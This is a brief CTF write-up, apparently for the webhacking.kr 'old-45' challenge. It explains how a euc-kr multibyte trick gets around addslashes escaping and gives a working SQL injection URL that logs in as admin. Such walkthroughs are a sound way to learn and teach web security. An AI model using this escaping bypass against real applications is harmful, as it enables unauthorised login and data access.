---
layout: default
title: old-45
---



another sql injection.
here we use insert %bb and then, after the addslashes put `\` before the `'`, it'll take the %bb + `\` and encode in `euc-kr` format.

this is the payload i gave:

here we want to insert this: `id=%aa%27%20or%20id%20like%200x61646d696e'`, this is like: `' or id like admin`
this is the query i used in the http get
```
https://webhacking.kr/challenge/web-22/?id=%aa%27%20or%20id%20like%200x61646d696e--%20&pw=guest
```
